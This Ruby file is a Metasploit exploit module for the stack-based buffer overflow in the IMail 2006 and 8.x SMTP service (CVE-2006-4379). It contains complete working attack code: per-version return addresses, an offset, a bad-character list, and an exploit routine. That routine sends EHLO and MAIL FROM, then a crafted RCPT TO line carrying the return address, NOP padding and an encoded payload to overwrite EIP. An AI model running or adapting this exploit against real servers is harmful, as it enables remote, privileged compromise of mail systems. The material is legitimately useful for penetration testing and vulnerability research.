require 'msf/core'

module Msf

class Exploits::Windows::Smtp::Imail_Smtp_Rcpt_Overflow < 
Msf::Exploit::Remote

	include Exploit::Remote::Smtp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'IMail 2006 and 8.x SMTP 
Stack Overflow Exploit',
			'Description'    => %q{
				This module exploits a stack based 
buffer overflow in IMail 2006 and 8.x SMTP service.
If we send a long strings for RCPT TO command contained within the 
characters @ and :
we can overwrite the eip register and exploit the vulnerable smpt 
service.
This is a porting from c source code of Greg Linares.
			},
			'Author'         => [ 'Jacopo Cervini 
<acaro@jervus.it>' ],
			'Version'        => '$Revision: 3110 $',
			'References'     =>
				[
		['BID', '19885'],
		['CVE', '2006-4379'],
		['URL',   
'http://www.zerodayinitiative.com/advisories/ZDI-06-028.html'],


				],
			'Platform'       => 'win',
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'     => 400,
					'BadChars'  => 
"\x00\x0d\x0a\x20\x3e\x22\x40",
				},
			'Targets'        => 
				[
					[ 'Universal IMail 8.10',   { 
'Ret' => 0x100188c3, 'Offset' => 0x1e8 }, ], #pop eax ret in SmtpDLL.dll 
for IMail 8.10
					[ 'Universal IMail 8.12',   { 
'Ret' => 0x100191c4, 'Offset' => 0x1e8 }, ], #pop eax ret in SmtpDLL.dll 
for IMail 8.12

					],
			'DisclosureDate' => 'Sep 7 2006'))
	end

	def exploit
		connect

		pattern0 =
			'EHLO'+"\r\n" 

		print_status("I'm sending Ehlo request")

		sock.put(pattern0)

		pattern1 =
			'MAIL 
FROM:'+"\x20"+"\x3c"+'acaro'+"\x40"+'jervus.it'+"\x3e"+"\r\n" 

		print_status("I'm sending mail from request")

		sock.put(pattern1)

		pattern2 = 
			'RCPT TO: '+
			"\x20\x3c\x40"+
			[target.ret].pack('V')+
			"\x3a"+make_nops(target['Offset'] - 
payload.encoded.length) +
			payload.encoded +
			"\x4a\x61\x63\x3e"+
			"\n"

		print_status("Trying #{target.name} using pop eax ret at 
#{"0x%.8x" % target.ret}")

		sock.put(pattern2)
		
		handler
		disconnect
	end

end
end	

